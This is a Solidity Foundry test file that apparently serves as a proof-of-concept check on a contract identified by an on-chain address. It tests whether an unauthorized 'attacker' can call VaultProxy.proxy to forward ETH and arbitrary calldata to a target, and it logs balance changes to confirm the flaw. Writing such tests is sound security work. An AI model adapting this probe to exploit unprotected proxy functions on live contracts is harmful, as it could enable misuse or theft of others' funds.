// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbaa3de6504690efb064420d89e871c27065cdd52.sol";

contract MockTarget {
    event ReceivedCall(address sender, address caller, uint256 amount);
    
    function mockFunction() external payable {
        emit ReceivedCall(address(this), msg.sender, msg.value);
    }
}

contract VaultProxyTest is Test {
    VaultProxy public vault;
    MockTarget public mockTarget;
    
    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(attacker, 10 ether);
        
        vm.prank(owner);
        vault = new VaultProxy{value: 0}();
        
        mockTarget = new MockTarget();
    }

    function testUnauthorizedProxyAccess() public {
        // Prepare malicious transaction data
        bytes memory data = abi.encodeWithSelector(
            MockTarget.mockFunction.selector
        );
        
        uint256 amount = 1 ether;

        // BEFORE: Record target balance state
        console.log("--- BEFORE-Trigger Balance ---");
        uint256 beforeBalance = address(mockTarget).balance;
        console.log("Target balance:", beforeBalance);

        console.log("--- Trigger Proxy Call ---");
        // Attacker calls proxy with 1 ETH
        vm.prank(attacker);
        vault.proxy{value: amount}(address(mockTarget), data);
        
        console.log("--- AFTER-Trigger Balance ---");
        uint256 afterBalance = address(mockTarget).balance;
        console.log("Target balance:", afterBalance);
        uint256 balanceDifference = afterBalance - beforeBalance;
        console.log("Balance difference:", balanceDifference);

        // Differential verification
        if (balanceDifference == amount) {
            console.log("Vulnerability Exists: Attacker successfully forwarded funds via proxy");
        } else {
            console.log("Vulnerability not Exist: Target balance did not increase by sent amount");
        }
    }
}